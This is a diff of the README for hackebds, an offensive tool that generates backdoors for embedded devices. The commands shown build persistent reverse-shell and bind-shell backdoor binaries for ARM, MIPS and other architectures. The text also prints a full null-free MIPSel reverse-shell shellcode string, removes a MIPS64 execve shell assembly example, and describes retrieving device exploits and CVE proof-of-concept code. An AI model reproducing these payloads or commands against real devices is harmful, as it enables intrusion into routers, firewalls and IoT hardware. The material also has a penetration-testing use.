@@ -34,7 +34,8 @@ main functions:
    now supported, and they are still being updated** (PS:bash support is
    added to the reverse shell after version 0.3.1). If the backdoor of
    the reverse shell is generated with the - power parameter, the
-   reverse shell will continue to be generated on the target machine)
+   reverse shell will continue to be continuously generate on the target
+   machine)
 
 2. Generate **reverse_shell shellcode** (only linux) of various
    architectures during the exploit process, and no null bytes, which
@@ -44,7 +45,9 @@ main functions:
    still being updated**
 
 3. Generate bind of various architectures bind_Shell(only ELF) file,
-   -power can persistent bind_shell
+   -power can persistent bind_shell（ If you need to use -power
+   parameter, you can specify the bash shell, and please do not hang the
+   process in the background to prevent data redirection errors）
 
 4. Sort out the exploitable vulnerability POC or EXP of the embedded
    device, and search and output the basic information and POC of the
@@ -64,7 +67,7 @@ install
 .. code:: 
 
    Use pip install:
-   pip(3) install -U hackebds
+   sudo pip install -U hackebds
 
    local install:
    git clone https://github.com/doudoudedi/hackEmbedded
@@ -77,16 +80,16 @@ python/bin in the bashrc environment variable）
 
    echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png
    :alt: 
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png
    :alt: 
 
 Instructions for use
 ~~~~~~~~~~~~~~~~~~~~
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png
    :alt: 
 
 | Please install the corresponding binutils environment before use
@@ -104,19 +107,23 @@ Instructions for use
 1. Use the command line to generate the backdoor file name, shellcode,
    bindshell, etc
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png
       :alt: 
 
    .. code:: 
 
       hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
+      or
+      hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shellcode
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png
       :alt: 
 
    .. code:: 
 
       hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
+      or
+      hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file
 
    By default, the reverse shell backdoor is created using sh. If bash
    is required (PS: here, the bash command needs to exist on the target
@@ -125,6 +132,8 @@ Instructions for use
    .. code:: 
 
       hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
+      or 
+      hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash
 
    If you need to generate a backdoor and constantly create reverse
    shells (the CPU occupied by the test is about% 8)
@@ -132,8 +141,10 @@ Instructions for use
    .. code:: 
 
       hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
+      or
+      hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png
       :alt: 
 
    .. code:: 
@@ -151,7 +162,7 @@ Instructions for use
    supports repeated connections (currently this function is not
    supported by powerpc and sparc series)
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png
       :alt: 
 
    Generate cmd_file function is updated. Only need to specify the - cmd
@@ -163,14 +174,14 @@ Instructions for use
 
       hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png
       :alt: 
 
    | The list relationship between the output model and the architecture
      is added to the function of generating the back door of the
      specified model to facilitate the user to observe and modify. The
      output information will be enhanced after version 0.3.5, such as
-     (60 device information, POC40+or so):
+     (100+ device information, POC80+or so):
    | Function of equipment
    | Architecture of equipment
    | Device CPU manufacturer
@@ -188,13 +199,14 @@ Instructions for use
 
       hackebds -l
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png
       :alt: 
 
-   Add the retrieval of device information. Use - s to search for the -
-   model parameter. This search is fuzzy and insensitive to case. Try to
-   use the device information with the highest matching degree between
-   lowercase output and input when inputting
+   Added retrieval of device information, using - s to search for the -
+   model parameter. This search is fuzzy and case insensitive. Try to
+   use lowercase when inputting, and finally output the device
+   information with the highest matching degree with the input（The
+   introduction of EXP and POC in version 0.3.7)
 
    If the following error occurs
 
@@ -225,7 +237,7 @@ Instructions for use
 
       pip install python-levenshtein
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png
       :alt: 
 
    The POC corresponding to the generated device can use - p or -- poc,
@@ -236,7 +248,16 @@ Instructions for use
 
       hackebds -model ex200 -p
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png
+      :alt: 
+
+   Added search for CVE
+
+   .. code:: 
+
+      hackebds -CVE CVE-2019-17621
+
+   .. image:: https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230530172408297.png
       :alt: 
 
    If a vulnerability is found in the test and you want to add the basic
@@ -253,7 +274,7 @@ Instructions for use
 
       hackebds -add
 
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png
+   .. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png
       :alt: 
 
    If there are device information errors, POC errors, or you want to
@@ -304,7 +325,7 @@ x86（32bits） and 8 characters for x64（64bits））
    [+] mipsel_backdoor is ok in current path ./
    >>>
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png
    :alt: 
 
 .. code:: 
@@ -318,12 +339,12 @@ x86（32bits） and 8 characters for x64（64bits））
    [+] x86_bind_shell is ok in current path ./
    >>>
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png
    :alt: 
 
 Then connect to the port bound to the device (password exists)
 
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png
+.. image:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png
    :alt: 
 
 1. Generates the use-back shellcode (no free) null bytes corresponding
@@ -357,24 +378,6 @@ example:
    >>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
    [+] No NULL byte shellcode for hex(len is 264):
    \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
-
-1. Added that shellcode for calling execve cannot be generated in
-   shellcraft (change context generate mips64(el), powerpc shell code
-   for execve("/bin/sh",["/bin/sh"]),0))
-
-   .. code:: 
-
-      >>> from hackebds import *
-      >>> test = ESH()
-      [*] arch is i386
-      [*] endian is little
-      [*] bits is 32
-      >>> test.sh()
-      [*] Please set correct assembly schema information(pwerpc or mips64(el))
-      >>> context.arch = 'mips64'
-      >>> test.sh()
-      "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
-      >>> test.sh()
 
 chips and architectures
 -----------------------
@@ -453,6 +456,14 @@ bind_shell and cmd_file files of the aarch64 architecture
 
 2023.3.7 0.3.6 Added support for the mipsn32 architecture (this
 architecture may be encountered in devices such as zyxel firewalls)
+
+2023.5.30 add the retrieval of CVE and output the content of EXP and POC
+files in the device information
+
+2023.11.11 Fixed the issue of armv5 series backdoors not being able to
+generate shells in Vitogate_300 The rear doors are operating
+normally，Simplified reverse\_ Command parameters such as IP can be used
+with - lhost and - lport, Added some device vulnerabilities
 
 Problems to be solved
 ---------------------
